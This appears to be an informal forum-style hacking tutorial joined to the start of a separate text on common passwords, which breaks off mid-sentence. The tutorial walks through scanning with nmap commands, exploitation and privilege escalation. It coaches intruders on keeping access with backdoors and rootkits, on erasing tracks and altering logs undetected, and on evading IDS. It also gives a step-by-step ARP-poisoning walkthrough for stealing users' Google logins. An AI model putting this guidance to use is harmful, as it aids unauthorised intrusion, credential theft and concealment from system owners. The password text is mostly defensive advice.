Alright, now you at least have an idea of what reconnaissance is! lets talk about scanning...  When you scan your targets network, you actually start touching the system. Scanning a network determines whats in there, scanning network gives you the feel of how your targets network is laid out, if there are multiple subnets, which hosts are alive, check ports, see if system is alive, discover available hosts & get info about the discovered hosts. There are thousands of tools can be used to scan networks! Scanning a network can easily get picked up by IDS. Anyhow, no one will pay attention except if you do it over and over because scans happens on such a regular basis on the internet. Therefore, people who read the logs, i means the webmaster wont really pay attention to every single scan that occurs, so you dont have to worry alot. There are ways to avoid being picked up by IDS :-). After you finish scanning, you will gain a list of network nodes that exists there.  \"" Node \"" is an active electronic device that is attached to a network, and is capable of sending, receiving, or forwarding information over a communications channel. If you want to learn more, google it or visit  http://en.wikipedia.org/wiki/Node_(networking)  ...  Ok now we want to discover live hosts via scanning. This is the first action taken against your targets network. Depending on what method of scanning you use, you can be detected by IDS. Most admins will ignore detections because it happens alot unless something abnormal happens.  There are various scanner tools, e.g.  nmap ,  superscan , and  many more . There are various scan methods, some are stealthy, others are not.  Before i talk about various scanning methods, let me explain to you about TCP connections basics. When you scan your target using TCP communication, there are six TCP flags can be utilized during packet transmission(packets get transmitted during scanning process). A flag will indicate whether the sent packets are syn, ack, fin, urg, psh, or rst packets. These packets sets you in a position on how you want to communicate with the remote host. You can get different info depending on the flag you choose for the scanning.    TCP establishes three handshakes, syn, syn-ack, ack. What are they?  When you scan your target using TCP communication, you send a syn packet(syn request), and then target sends you back an ack packet with syn packet. Now, you send an ack packet to the target. So now both machines establish the connection well, like they have made a well established tunnel for a proper guaranteed communication without losing any packets during communicating with each other. A hacker can get caught easily if he uses this method to hack other systems illegally.  Hackers use non-standard combination of these six flags, which gives them info that are not normally available to the public.    Have you heard about syn flood?   syn flood is done by utilizing three handshake by sending \""syn\"" request to the target, so the target receives a syn request and send an a syn-ack back to the originator(you). You ignore the target syn-ack request - when you ignore it, then the three handshakes is not completed, this is called half open TCP connection - In theory, when the target sends you syn-ack, the target allocates some RAM on its machine.   The amount of RAM on the target machine must be open until it gets response (ack packet) back from you because till now only two handshake has been made,so the TCP connection process is not completed yet. However, there is always a time limit for the RAM to be opened, so if 30 secs passed by & the target did not get the ack from you, the connection will abort(failed TCP handshake - timeout) & RAM will be deallocated.   The idea here is to send hell alot of packets in few secs so in 30 secs, you can send 40 million packets(lets say one packet size is 1kb) which is heavy on the RAM since the RAM might not have enough memory to carry 40 million packets. Therefore, you force the target to make half open TCP connection attempts, so definitely the target machine will stop responding to legitimate request. In other words, if you send 40 million syn requests to that remote host, its going to allocate a hell of a lot of ram for those requests. After a while, its going to eat up all of the ram. Thus, target system goes down. This is called syn flood attack.   In short, syn flood attack makes the system (i.e. the IP stack or kernel) chokes on the memory allocations (or simply runs out of memory) or the target application (i.e. web server) chokes on the processing load. You got it? Or not yet?!  Syn flood is an old technique i just mentioned it here for illustration purposes.   General Information:  these days, SYN floods are used to make systems inaccessible. They have a limited number of half open connections, you use them all, and they cant accept any more SYNs. But again, modern software throws away old SYNs once the limit is reached. Note that different systems will behave differently.   If you interested in learning more about syn flood, visit   RFC 4987 - TCP SYN Flooding Attacks and Common Mitigations   Lets talk about the most common TCP Scan types. There are  full scan ,  half open scan ,  stealth scan ,  Xmas scan , and  ack scan .   full scan:  this completes 3 way TCP. it is the most effective & gives more accurate results. However, it is not safe and easily traced and detected.   half open scan:  it is the second most effective scanning method, only uses first part of the handshake to get syn-ack but does not send 3rd part (ack) back to the remote host. The idea here is if the remote replies back to you after you have sent syn request, this means the port - we sent the syn to - must be open.    stealth scan:  the idea here is to scan ports randomly(not in sequential order) & reduce the speed of scanning. If you scan all port from 1 to 65536 in sequence, your more visible to be detected, and usually scanning happens so fast, which is unusual since regular program does not connect to port that fast, so this can make it easier to be detected. Therefore you have to scan ports randomly & reduce the speed of scanning. To avoid IDS, you should not use full connection scan with stealth scan, you can use half-open scan(syn). syn is considered a stealth scan. In fact, syn scan is called syn-stealth scan, or you can use Xmas scan with stealth scan which helps you to evade detection, things like that! you get my point i guess.   Xmas scan:  uses fin, urg, and push flags which are used to bypass some firewalls. Xmas scan works with UNIX system, it does not work with Windows system.   ack scan:  this helps you evading IDS not to get you detected. You send only an ack packet to your target, your target wont know how to deal with it since there was no handshake. Thus, ack scan causes open ports in your target machine to return a reset packet(rst), rst packet gives you a hint that the port or service is not filtered between point A and point B, which usually firewal resides in between! Since the port replied you with rst packet this means there is no firewall between A(your machine) & B(port or service on the target machine) and rst packet also gives you an insight that the target port is open ;-). If there is a firewall, your ack packet would not reach to the target port & because of that you wont get any rst packet. In addition, rst packet helps you indentify what system is running on the remote host.  These are the most common method of scans, there are hundreds of scanning methods! nmap allows you to set your own custom scan type e.g. instead of sending ack flags only, you can send ack flag and rst flag together and see what you get back from target ...  OK! we have talked about how TCP scanning works in general. Now, i will be talking about UDP & ICMP Scanning ... UDP and ICMP connections most of the times are blocked at the firewall level & even at the host level in some cases. We are going to scan on hosts & ports that respond via UDP. When you scan your target via UDP, there are many problem will occur during that process e.g. you can scan over the ports via UDP, assume you scanned port 1, and port 1 is closed, then host will send ICMP unreachable back to you, which gives an insight that port is closed because you didnt get any UDP response back from target! Making sense,right? Unfortunately, we will never get a response back from target to ensure you that port is open!  Thats how UDP call works, send the packet & forget it. Lets say we come across port 21, and 21 is open, then port 21 on target machine will not reply back to you because UDP does not give you the guarantee the delivery packets during communication process, it just send the packet and forget, unlike TCP which guarantees the delivery of packets with no loss or corruption. Since we didnt get reply back, then we can assume the port 21 is open *OR* maybe port 21 is closed and ICMP reply got lost somewhere so we didnt get it! A general rule, when you dont get a reply you assume port is open.   Some high professionals security person purposely configure ports to not to respond a UDP scanning. ICMP scanning is as same as UDP. ICMP scanning is noisy & can be picked by IDS very easily because ICMP sends random several pings to the network instead of a single host(ICMP scanning does a ping scanning - sends ICMP packets - to the whole network instead of a single host). After you finish ICMP scanning, based on the replies you get back from the live hosts, then you can determine that your target network is listening for ICMP traffic and you might to do some exploit based on that. Unfortunately, there arent alot of ICMP exploits going around, so you are just going to use ICMP for network enumeration, you just do it to see what hosts are up, host A is up , host B is up & host C is up, they are replying for my ICMP. Thus, this let us know these 3 hosts are running on the targeted network and potentially can be a target for us. IDSs are always listening for network scans & alot of network scanners provide a support for ICMP scanning, but do not have a way to make it stealthy! Therefore, ICMP can turn on the IDS alert which tells the security person there is somebody scans your whole network.   nmap  is a great tool that is very popular, it is usually used to scan networks, hosts, ports, and does alot of other stuff. It is very intrusive tool and considered a hacking tool. Using nmap against systems you dont own or dont have permission to scan can be considered illegal. Lets see examples of some scanning method!   Example of ICMP Scanning( -sP ) - this is called  ping scan   nmap -v -sP xx.xxx.xxx.xx > filename   nmap:        represents the program we are running which nmap.  -v:          for increased verbosity, which means bring me extra details of the targeted system. (Optional - as far as i know)  -sP:         the flag that determines the scanning method.  xs:         target IP address.  > filename:  output the results to the newly specified filename. In other words, save results in a file (Optional)  This above command shows you the systems that are up and running, so this shows what available to us on the targeted network. As a result, you will get simple info that shows you there are number of IP addresses that responded to ping request - Note: there could be alot more machines out there that are not responding to ICMP scanning.   Lets see an example of UDP scan, UDP scan not so speed.   nmap -v -sU xx.xxx.xxx.xx   Results of UDP scan(-sU) give more info than ping scan(-sP). Keep in mind there could be hundreds of other ports are listening on the system which simply dont respond to UDP connection.    Useful sources relates to scanning methods via nmap:   nmap-tutorial   Port Scanning with NMAP - Installation & Usage of NMAP   ALRIGHT , now you have a good basic understanding about scanning! Next, i will be talking about fingerprinting! So keep learning :-)   Now lets get deeper! By now we have determined what nodes are running up on the network. So we are ready to gather large info on those live systems we discovered in the previous steps. Ok! now you need to discover what services (application) are running on your targets host. Every (or at least many) port has a service running on it. For example, web server usually are running on port 80. What we have to do is scan ports, see what kind of services(applications) are running on them, try to grab the versions of the services, this will help you to determine the OS as well. This is called Port & Service Enumeration(fingerprinting). We have to do this step to understand what potential vulnerabilities your target has & how to exploit them.  Assume after we have scanned our target system, we found our target runs \""IIS 5.0 Server\"" on \""port 80\"". Based on the scanning result, you can say the targer server is running IIS 5.0(IIS is set of Internet-based services, IIS is the second most popular web server - IIS is a Microsoft product), it is known IIS 5.0. has too many vulnerabilities & IIS 5.0 runs on Windows 2000, which Windows 2000 by itself has hundreds of vulns.  In other words, lets scan ports and services, and do OS fingerprinting, lets identify services on those live host in our target network. Once we know what services are running and what OS are running then we can start exploiting these services! - ping/port/service scans are frequently run together using the same tool.    NOTE:  identifying ports & services is the most critical part in hacking ... PERIOD  OS fingerprinting is used for determining OS type and version, then we exploit vulns. that resides into the OS. When you fingerprint a target, your targets OS can be known from the TCP/IP stack, so fingerprinting happens on TCP/IP stack. Why? Because each OS has a unique implementation of TCP/IP, so TCP/IP stack is implemented differently from OS to OS, so an exact same query sent to one machine the respond of the result will be different than the other machine. Therefore, based on the response this can help the scanner determines the OS of the target, because every OS has its own unqiue response when you do OS fingerprinting request.   When you do a default install of OS, certain services will be installed by default, services that are needed for that OS to work properly, e.g. ports 137,138,139,and 445 which all combined together to produce Win 2000 OS or above. Another example, a combination of 139 and 445 can determine a certain version of windows such as Win XP or Win 2003, there are lots of ways to determine OS. Another example, if you see a service MS SQL is running on a certain port, you can determine the target OS is not in *nix family, it is in a Win family cause the target is running a Microsoft sql product. Thus, we can say port enumeration or service enumeration can help you in determining OS.   There tons of popular scanners out there:   SuperScan  - Works good on Win OS.  Nmap  - Works on *nix & Windows, *nix version is much more stable than Win version.  Most scanners offer  full ,  half ,  stealth , and  UDP scans .  You are goning to spend most of your time scanning your target machine to know whats available there, so you can exploit the vulns & penetrate the system. Therefore, you have to do some exploration on scanning methods & decide which method of scanning you feel more comfortable with...  Lets see an example of enumeration style scanning. Just keep in mind, this can be considered hacking! Make sure you do to your system, not somebodys else.   This is kind of a stealth scan:   nmap -v -sS -A -sV xx.xxx.xx.xx > filename   This above request gives you very specific details about your target. sV is for version information identification. Check out the manual to know what these flags do - type \""man nmap\"" to see the manual...  Alright, after we have fingerprinted services & OS, now its the time to check for various vulns against application(services) & OS running on the target system. This is called  vulnerability assessment . To do vulnerability assessment, you can use the tools available, such as nessus.  Nessus  is free vulnerability assessment, huge database, its the best assessment tool.  Lets scan vulns on the target system. Lets say target system is win 2000 SP1 IIS 5.0, nessus goes back to its database and check the vulns for win2000 & IIS 5.0. If there is vulns not discovered, vulnerability assessment tool actually cant catch it. However, if nessus couldnt find matching vulns for the target system, it will let you if the system can have some security issues or not. Such tools are considered as Automated Vulnerability Assessment Tools. You have to know about the target system OS so you can do vuln assessment on it. There are vuln assessment OS specific, e.g. MBSA tool(only scans Win OS).   NOTE:  you can do vulnerability assessment manually, this depends on you and your skills. By doing it manually, you can discover vuln. that nobody knows about it, and you can use it for your own use. It is a powerful and very discrete.  After we determined what systems & what services contain vulnerability, then we can exploit it(means take a chance of this vulnerability to achieve what you want).   common vulnerabilities out there are:   OS vulnerabilities Webserver vulnerabilities Database vulnerabilities TCP stack vulnerabilities Application vulnerabilities   Malwares, viruses, trojans, can be used to exploit vulnerabilities.  There are several automated vulnerability scanners, such as  Nessus ,  Nikto . Security websites is a good resource for vulnerabilities as well, e.g.  bugtraq ,  CVE (Common Vulnerabilities and Exposures) sites, etc. Another good source to find vulnerabilities is  hacker web sites .   Lets talk about the tools:   *Nessus  - this is a great vulnerability assessment tool. However, in alot of cases it will perform exploits to see if the OS or service is actually vulnerable or not.   *Metasploit Framework  - this is not vuln assessment tool. It is an exploitation tool, it contains hundrands of exploits helps you to exploit the system by using a nice selection of tools.  I will explain shortly about the common vulns...   OS Vulns:  OS exploits are used to gain access to the system. OS exploits can used for DoS attacks too. watch the video tutorial. Most OS holes exist from default configuration, services and applications.   Webserver Vulnerabilities:  webservers are the most trageted section. All people contact the webserver, thus you never know the hacker than a normal user. Webservers examples, Apache, IIS, and Tomcat. After you exploit the vulnerability in your target webserver, you can gain many different things, such as root access(the gist), website defacement, DoS(put the server down), theft or alteration data on server, or further penetration into the network. Webserver is a great place to start when you want to do a penetration test!   Database Vulnerabilities:  those software vendors who create databases applications such as SQL, Oracle, etc - they dont have security in mind, they care more into effeciency and how to make it easy for the users to handle with the database. They care about making their customers happy without giving that much attention in security issues!   TCP Stack Vulnerabilities:  this is not a common used method to hack systems. Google it!   Application Vulnerabilities:  some examples of application vulnerability, buffer overflow, weak authentication mechanisms, poor data validation(the most common one), and poor error checking.  ALRIGHT, to discover these vulnerabilities on the target machine you need to do vulnerability assessment. This can be done in two ways, manually or automatically. Manually means you try to discover a vuln. by yourself which eventually you will have vuln. that nobody else knows it & you can use it for yourself or publish it to security sites. Automatically means you rely on a tool that searches for vulns in the target machine, this tool has a database full of vulns. so this tool will only inform you the vulns found in the target machine by relying on its database. We are going to talk about auto vulnerability assessment. The most common & wonderful tool is Nessus, its free open source code!  Alot of common sense comes into play when analyzing vulns, for example you do not look for a database vulnerability in a webserver, things like that. Another resources, OVAL - gives you a good and basic foundation of vulns assess. methodology, FrSIRT - keeps track of vulns and make exploits of these vulns, you can join a paid subscription and then browse vulns avaialbe in their database and download exploits this is a good source for hacking or security, and websites for posting exploits such as milw0rm, hacking sites.  Lets have a closer look at  nessus  tool, nessus is client/server architecture. The process of setting it up is cumbersome. Nessus have about 9000 plugins, therefore it takes time to peroform the assessment. Results can be reviewed in a report. The report includes the vulnerabilities found on the target machine with a short description about the vulnerability.   Note:  you can enable several plug-ins in plugin tab. You can specify range of ports through scan options. To specify the target, you should go to the target tab.  Once we have done the vulnerability assessment, and knew what vulnerabilities exit. We start gathering exploits of the found vulnerabilities to penetrate the system.  Lets talk about penetration and access! After all information we have gathered previously, its the time to break the system with the exploits you have.  Its the time to stop gathering information and start breaking into system. The ultimate goal is to gain the highest level of permissions. Try to use undiscovered techniques and methods. Think out of the box!   Some of exploits that enable penetration are:   * Buffer overflows  * Stack exploits  * Web vulnerabilities  * Services/apps that allow unauthenticated access.   Aside from the standard methods of penetration, lets see an penetration methods, here are some examples:   *SQL Injection  - ability to change queries in the application before its sent into database.   *Application Error Handling  - this can result DoS. Probably one of the most common vulnerability you can find in corporate arenas.   *Directory Traversal  - browse directories you should not be able to do so on.   *Malformed Packets  - one of the more difficult methods of penetration, requires very extensive knowledge of how TCP packets are assembled and disassembled. But once you get used to it, its probably the most effective ways of hacking.   *Bypassing Access Controls  - password cracking is most common means of accessing systems.   *Social Engineering  - i guess you know what it means.   *Sniffers  - take passwords right off the wire, alot of protocls and application such as http & ftp communicate parrwods over the wire in plain text.   *Session hijacking  - it is similar to sniffers, but you dont gain a password because we take off the entire session, hijack the victims session & act as you are him.   Usually when you get passwords, you get it encrypted, or hashed or hidden in some way or another. Password cracking can be done in several ways, examples:    *Brute Force Attack  - Every password, can and will be broken by brute force attack. It is about the time. Depends on the size of the password.   *Dictionary Attack  - less effective than brute force, relies on list of words or phrases.   *Hybrid Attack  - combination of different tools. It is a combination of effectivence of brute force and dictionary attacks & often using other attack mechanisms, such as cryptanalysis attack (one of the hybird attack).  You should know that when you do sniffing, you often get usernames & passwords in plain text. However, you can get encrypted passwords from sniffing as well. You will need to use of the cracking techniques discussed above. Sometimes cracking an encrypted passwords can take secs, hours, days, months, or even more!!!  There is a great software called \"" Cain & Abel \"", it sniffs passwords from the wire, cracks it, etc. Once you install it, go to sniffers tab, then move to the found passwords in cracker tab to see what you have got! There is lots to it. You should know these techniques as a security person cause if you dont know it, a black hat will take care of it.  Now, assume we already have hacked the system. We will try to do different things, such as getting the root, etc. Penetration & compromise got some differences in the meaning. Hacking into system does not mean you have compromised(taking the full control - take over) the system. After you penetrate the system, you can grab the session between client and server, e.g. you keep listening on login sessions, so when the remote user login to google, the session be dropped to you, once you get the session, the remote user wont be able to get into his account he/she will see at page goes blank(disconnected), so he/she may think its a problem in a connection, thus he/she tries to login again & everything works fine! BUT you already got his session, you wont have to go through login page when you want to see his/her email inbox, cause its already among the whole session you have taken.   Another way to do this, lets say the attacker has compromised the users system, thus the attacker can let the session drop on his machine, then he takes the session, reads and saves it. After that, he redirects the user to the server, this step will make everything works ok like nothing wrong happen.  Lets see an example of the above explained steps, after attacker installs \""Cain & Abel\"" application, he moves to \""attack base system\"" & click the sniffer button at the top & click the yellow button(APR Poisoning Button) besides the sniffer button. This APR Poising button trick the attacked system to talk to the attacker instead of normally who it talks to. For testing purposes, go and add various system addresses(IPs) to the list. Let say one of the user amongst those targeted IPs logon into google, at the authentication process you will notice varies pieces of info comes to you. You are gathering info by getting into the middle of the communication process. Now view the files you have got in the list, you can see among the lines the username & password of the users google account in plain text!  So how dangerous this can be to your privacy :-/! So be careful....    Once the hacker gains access to the system. He aims for admin(root) access. He moves up from guest level, to user level, up to root level. Owning the box, means take the system & prevent the admin from controlling the system, as well as preventing other hackers from getting in. So you hackers usually move on from the regular level, to the admin level so they can have full control. A hacker needs privilege escalation to compromise the system well. Some exploits allow buffer/stack overflows to obtain admin access. All it takes is a guest user, then a hacker can perform exploitations locally & there he goes to the root.   At this point, we did everything up to owning the box. Now our goal is to protect our access. Thus, we want to maintain our access to that hacked system, so we can use it later. You can maintain a system by using such tools, backdoor accounts, backdoor software programs, rootkits, etc. These tools help you maintain access. Some hackers own the box close all other accounts except his account, so the security person shut the system down, reformat the system and start over again.   By doing this, hacker account will be gone. Once we ensure we have maintained our access to the system, then we want to expand ourselves to other parts of the network. Remember, if you do not do this on your own network, somebody else will take care of it. If he does, i do not think you will be too happy! Once you got an access, and could maintain it successfully. You want to prevent detection or loss of access. There are several methods to maintain access, such as rootkits, OS exploits, erase tracks, install trojans that make you access backdoor, enable null sessions (webmaster usually go to the registry & disable null sessions to keep that vuln. from being exploited, webmasters usually do it once & do not get back to it. You can go there & enable it - NOTE: by enabling null sessions you can give other hackers a chance to hack too), and many more.  There different ways of system compromise, system compromise usually depends on your goal, examples of system compromising are root access(ultimate goal), data access/theft, DoS, and many more. Keep in mind, compromised systems can be detected after a while.  Now after a hacker breaks into the system, he tries to portect what he has hacked & erase his tracks. During the attack process try not to be detected so the webmaster dont shut the server off, as well as do not forget to erase your tracks, e.g. you dont want the webmaster to see lots of failed logon in the log files, so you erase tracks to prevent future detection. Typically, get in the network as a shadow or ghost.   There are many method to evade those IDS so they dont cut off your attack stream. Common methods for evading defenses might be by fragmenting packets(some programs do that e.g. fragroute), port redirectors, encoders(change the flow, the look, and feel of various traffics to pass firewall). After you get in and deceive defenses, you want to go to the log files and erase your tracks. Remember: sometimes you get in a user account then you get into a root by changing permissions of the user account, so you have to remember to set this user permissions back to as it was, things like that - you know what i mean, put yourself in a hackers shoe. Dont delete the whole log files, this can make the security person more suspicious. We want to leave everything as it was so nobody can get a feel that an intruder was here.  To be safe, you should know where your actions are recorded, delete log files and other evidences that can get you caught, steganography(google it), and evading IDS & firewalls. All actions are recorded in some place on the system or the network. Assume IDS detects you, what do security persons do? Usually when you get detected, they may cut off all the ways for you so you dont get a chance to penetrate, they probably going track you down, or they may decide let you go but watch you the entire time.  Where are your actions recorded & what things can let security person knows that you hacked his system? they are recorded in log files for various applications(e.g. IIS & Apache log files), file access times(note: there are tools for hackers that allow you to modify file access time), windows registry entries, hacker tools left behind (be aware of the residual configuration you have left behind - make sure you set all the configurations back to as it was), OS performance stats, IDS, proxy servers(make sure how you send and receive data. If you are going to use proxy server, set up a permanent tunnel through the proxy to the remote host that is compromised), and firewalls(usually very rich with logs).  There are various types of IDS, IDS can set anywhere in the network. There are  network based IDS ,  host based IDS , and  application based IDS .  Deleting evidences of your hack is extremely difficult, it requires you have a very high knowledge of the system you are trying to compromise ( all the prior steps we did, such as scanning, foot printing, etc will be handy to compromise the system ) . It is easy to cover the known log files, such as web logs, firewall, IDS logs, etc. However, it is important to know how the default logs work. Highly skilled hackers, study the target well & take the time in fingerprinting & footprinting everything properly. It may take him up to one week before he hacks the target, but when he penetrates his job is done more smoothly & quietly. Unlike, the other ones who are just using some tools to break the system as fast as possible without studying the target well.  It is possible to delete log files! It is simple but usually requires admin access. Some files/logs may be deleted automatically with reboot. Dont delete log files, it brings up suspicion. If you do so, the security person can indicates very clearly that a hacker broke into the system.  Most common way of hiding your tracks is by using a rootkit. Rootkit is set of tools used by an attacker after the attacker gets the root-access to system. Rootkits conceals(to keep from being observed) attacker activities on the hacked system. Once rootkit set on the system, its practically impossible to rid of it because rootkit uses technology, called \""hooks\"", that usually most of the time embed itself into various components of OS & effectively the OS going to be a toaster when the rootkit is all set and done. Security person has to rebuild his machine when rootkit is detected after we properly investigate it.   Steganography  its about hiding a file into another file. Like hiding a malware into a normal software which makes it difficult for firewall or AV to detect the malware. Thats the basic concept of Steganography. There are alot of tools out there allow us to hide files inside another files.  You can evade IDS & firewalls by using random slow stealth scanning technique so traffic goes unnoticed, this takes longer to scan but makes detection more difficult. Try to use non-standard techniques, think outside the box.    Remember:  not everyone out there is a security expert. To secure your system well, you need to put yourself in a hacker set of mind.  By now, you have learned the basic methodology that hackers use to break into the system. Anyhow, lets take a closer look on hacking techniques, such as encryption, sql injection, sniffers, and many more.   Encryption:  files can be encrypted in a storage. Communication channels can be encrypted as well, communication channel encryption encrypts the entire communication path, so all traffics sent and received are encrypted, e.g. SSL technology encrypts the entire communication path. There are many ways hackers get away of encrypted traffic & get info in not encrypted form. If you are using your own encryption method, you always should test your encryption for crackability before you use it officially.    Sniffers:  sniffers is a common tool used by hackers. Sniffers listens on any traffic that goes through the wire of the target system, listens ins and outs traffics. Promiscuous mode is a mode that is listening for any traffic that goes through the wire. Standard promiscuous mode sniffer is a basic technique. There are more advanced techniques other than promiscuous mode. Sniffing enables the attacker to pick up a plain text, and other sensitive data that goes from or to the target. Sniffers record captured traffic, then after you sniff you can go offline & start analyzing that captured traffic. Popular sniffers are ethereal, etherape, ettercap, and network monitor(for Win OS only - not so effective).   Wireless Hacking:  this is a new technology & starts taking place nowadays. Easy to setup, but not frequently secured since not many people understand the security configuration, so they decide not to set it up or set it up poorly. There are various tools that detect wireless networks, popular war driving software are Netstumbler, Airsnort, Airopeek, Kismet, and many more. What is war driving? google it!   SQL Injection:  sql injection is a technique that allows an attacker to steal a valuable database information. This attack relies on poor data validation and poor error checking.   Buffer Overflows:  buffer overflow is common, the cause of buffer overflow is poor coding. Buffer overflows might be noticed while coding. Buffer overflow happens when the programmer does not clearly define boundaries on buffers or variables. We use out of bound data to insert malicious code or execute command on the remote host. Buffer Overflows can cause programs to freeze or lockup, can cause machine to crash, or let you use exploits & leads you to compromise the system. To build buffer overflows, you need a good programming skills, good knowledge of stack and buffer vulns.   You need to have the ability to research, analyze vulns & apply the exploit to achieve what you want. Buffer overflow is a very common & hard to produce an application with no buffer overflows at all. There is nothing programmers can do about it, they just need to write the code with security mind of set. If unexpected buffer overflow appears later by chance, programmers will have to fix it. Programmers should test their code from vulnerabilities as much as they can before they publish the application.   Rootkits:  it is a common hacker technique. Rootkit is malicious program that replaces components of OS. It does a stealth job. Rootkit requires root permission, so you can install it. Linux rootkits are common & you can find them everywhere, unlike Windows. It is very hard to detect a rootkit because it embeds itself so deeply into the target system. Removing rootkit from a system is very hard too, if the security person tries to remove the rootkit out of the system, he will destroy the system since the rootkit is embedded so deeply into the system(into components of OS). The good solution is to format the whole system & install it again.   Spoofing:  the word spoofing defined as making yourself appear as somebody else. Examples of spoofing, you can spoof an IP address and make yourself appear to be somewhere else, MAC addresses, and emails(very simple to spoof, you send an email to somebody by changing the headers, and things like that). Spoof usually relies on poor implementation of TCP/IP itself or poor implementation of applications. Tools that are used for spoofing differs from one platform to another. Example of the tools, IP spoofing utilities, MAC address modifiers, etc. Spoofing is more into using your skills rather than using a tool.    Denial of Service (DoS):  DoS is very common. The ultimate idea is to prevent legitimate users from using the system. Running DoS is very simple, you dont gain anything from doing DoS. Hackers do it to threat companies, things like that. Many methods/level of DoS attacks exist. Examples of some ways of to DoS, ping of death, Windows size overflow, smurf, teardrop attacks, and many more. There are lots of different ways to do it!   Web Hacking:  web hacking is the most popular attacks. It is based on hacking individual sites, servers, or components based on the website. First step a hacker takes is, enumerate services(applications) on target machine, and then determine what webserver software(apache, IIS, etc) is running on the target system. After that, the hacker exploits against vulns. found in the target system. It will be easier to hack if the hacker knows the version of the service/software running.  A webserver attack leads to deeper penetration on the network(move into the targets internal network). Popular attack methods are xxs(cross-site scripting), IIS DLL vulnerabilities(IIS is very commonly exploited), directory traversal, unicode attack, and many more.    What is Unicode attack?   here is quick rough description about Unicode attack, lets say you want to pass space into a URL. If you put a space in URL, webserver will not take your URL, webserver will consider the url is invalid. Thus, if you want to put spaces among the URL, you should put the number 20 in a place of the space(number 20 represents the space), so when the URL goes to the webserver, the webserver says Ok! thats a valid URL, lets process it and so it does. Unicode attack uses this technique in a non-standard(bad way) way to attack the webserver. Thats a quick explaination about unicode attack.  Im already about to finish this tutorial, i will just talk about popular tools in a brief manner. I will start with namp.    Nmap  is the most popular hacker tool outhere. Linux command line nmap works better and is supported better. Nmap comes with ping utility, port scanning utility, service enumeration & OS fingerprinting.    SuperScan  is a windows based tool developed by foundstone Inc. Its easy to use it & a good tool for Windows.   Nessus  is used for vulnerability assessment. It is an open source software kit, with commercial version available as well. Nessus uses client/server architecute. Server will be installed on a central location. Nessus comes in GUI & command line interface. Nessus uses database that carries latest current exploits for all types of OS & application. Databases in nessus are called plug-ins, hundrends of vulnerability plug-ins exist and are updated daily to include latest exploits. Nessus requires high level of knowledge to use the tool very effeciently. You can go out to the web and download an exploit and then add it to the database. Nessus can take quite long time to do vulnerability assessment.   Finally, the information in this tutorial have been gathered from various types of sources, and then i wrote the tutorial in an organized manner from scratch as well as i added some stuff & clarified many parts.   After you have read this tutorial, i recommend you to search and learn about Windows Null Sessions, it is the most critical flaws associated with Windows OS, and google about DNS zone transfers!   This tutorial is a good guide for you that gives you an insight on how to start & different techniques that hackers use and how they are used. I hope you have enjoyed this tutorial & helped you in someway or another. Im not supporting any illegal activities. This tutorial for people who wants to know how hackers think, what steps they take to break into systems & how they do it, so people can have an insight on how to protect themselves against intruders.   ***This tutorial is made for educational purposes only***    """
0	Most Common Passwords	""" Most people are clueless as to how accounts are hacked and their passwords reflect that. If you find anything in common with the most common passwords below you have a weak password. This is to help people choose a strong password and possibly help site admins understand the risks.  Most Common Passwords   123456, 123, 123123, 01234, 2468, 987654, etc  123abc, abc123, 246abc  First Name  Favorite Band  Favorite Song  first letter of given name then surname  qwerty, asdf, and other keyboard rolls  Favorite cartoon or movie character  Favorite sport, or sports star  Country of origin  City of origin  All numbers  Some word in the dictionary  Combining 2 dictionary words  any of the above spelled backwards  aaa, eee, llll, 999999,  and other repeat combinations Common Extensions   Some sites force you to have passwords with both numbers and letters. For example bobs password is football, and the site asks him to add some numbers to it to make it valid. Heres what people usually add.  Their year of birth / marriage / graduation (or expected grad) from HS or college  007  0 - 9  69  000, 111, 4444 or other long combinations  123456, 123, 123123, 01234 and other retarded combinations Years are usually added in different ways: football85, football1985, football04 instead of football4. Theres also the possibility of sub-connections like football_04 and football-84. Many sites require both numbers and letters so these are a more likely occurance since people tend to want to have the same pass for everything.  My opinion on an Ideal password   Mixed numbers and letters over 8 characters long. Memorize it once, use it forever.  How long it takes to hack a password   If they have hacked and downloaded the entire database its 10000 times faster than if they send requests guessing your passwords on certain websites. Most decent comps can check easily thousands possibilities per second. Most decent sites have captchas now which prevent brute force guesses.  Words in the Dictionary   If they steal a sites database you can get hacked fast, even if you use foreign words. The open office english spellcheck has around 70,000 words. Apps like passwordspro on my 2 Ghz cpu can check around 4,000,000 md5 possibilities a second, allowing to to breeze through several dictionaries, including possible variations like all uppercase/lowercase and backwards words. The latest nvidia cards with a coda gpu brute forcer can easily exceed 200 million md5s a second.  Numbers   If you have an all numbers password its much faster to crack than if it were mixed. Instead of having a massive array of words in memory and selecting an index from it, or even worse reading from disk every few seconds in a buffer, having a number just requires the computer to do what computers do fastest, count. At 2 Ghz my comp can check every number up to 14 million in 2 minute for salted md5s, making it possible to have a weak 8 character password. Adding 0s to the front of the number can help, but not really. A second pass with any number of 0s can be done afterwards. Maybe if you made it your zipcode+your best friends number or something VERY long it would be strong enough.  All Random letters   Every possible combination of 3 letter words is only around 17000 while every possible 4 letter word combination is 456976. It grows exponentially every time you increase just one letter. Most sites recommend 8 characters or more for a strong password. Adding just 1 character to your password helps expontentially. No dictionary words!  Why hackers usually dont care about your Computer   Contrary to popular belief most malicious hackers do not give a damn about giving you trojans or making your stupid windows computer crash. Then why are there so many trojans in p2p networks? Because of retarted script kiddy teenagers and nigerians that fancy themselves hackers using prebuilt trojan software. Hackers target servers. Why?  Massive bandwidth.  Mail servers with proper mmx records that validate spam checks  The possibility for phising.  Most servers are unattended meaning it can be months before the person finds out theres a malicious script bombing emails or phising people.  Exploitation of social networks. They can get a lot of credit card numbers or bank account information email bombing thousands of emails on a hijacked server rather than waiting to find a credit card number amongst all the instant messages and random typing you / your kids type throughout the month. Sure theres been a lot of home PCs infected, but usually this is the result of very efficient viruses that replicate and spread in-mass. Most people have decent antivirus software for hackers to want to waste their time flooding trojans. Some hackers use hijacked home PCs as DDoS zombies, but other than that youre more likely just to get spyware that floods you with ads.  How hackers usually obtain your password   Most malicious hackers just wait for security update news. Whenever some forum or cms software like drupal, vbulletin, phpbb or invision board releases a security update, they try and find what the discovered exploit was. They google search for forums that may have the affected system and use the exploit. Forums can give tons of emails / passwords. The ones who are skilled enough and actively attempt to discover the exploits are more rare. Even worse is when the skilled programmers make simple automated exploit programs for script kiddies to use without even understanding the code. This is where the majority of the attacks come from, losers that use programs made by hacker and call themselves hackers. Its super rare that you would be targeted or your password has been hacked from large sites like google, hotmail or myspace. Most of the big sites have capchas and DDoS protection, which cripples speed, Its more likely they hacked some other site that you long forgot about and found you conveniently use the same password for all your accounts including your email. From there they find even more passwords.. Most people get hacked from  phising attempts  or other forms of  social engineering  rather than 